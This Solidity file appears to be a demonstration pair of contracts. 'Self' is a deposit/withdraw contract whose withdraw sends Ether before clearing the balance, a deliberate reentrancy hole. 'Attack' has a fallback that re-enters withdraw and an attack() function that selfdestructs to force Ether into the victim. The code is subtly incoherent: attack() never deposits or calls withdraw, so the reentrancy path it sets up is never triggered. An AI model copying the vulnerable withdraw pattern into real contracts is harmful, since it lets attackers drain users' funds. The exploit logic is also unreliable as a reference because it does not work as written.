// SPDX-License-Identifier: MIT
pragma solidity ^0.8.4;

contract Self {
     mapping(address => uint) public balances;

    function deposit() public payable {
        balances[msg.sender] += msg.value;
    }

    function withdraw() public {
        uint bal = balances[msg.sender];
        require(bal > 0);

        (bool sent, ) = msg.sender.call{value: bal}("");
        require(sent, "Failed to send Ether");

        balances[msg.sender] = 0;
    }

    function getBalance() public view returns(uint) {
        return address(this).balance;
    }
}

contract Attack {
    Self self;

    constructor(Self _self) {
        self = Self(_self);
    }

    fallback() external payable {
        if(address(self).balance >= 1 ether) {
            self.withdraw();
        }
    }

    function attack() public payable {
        address payable addr = payable(address(self));
        selfdestruct(addr);
    }
}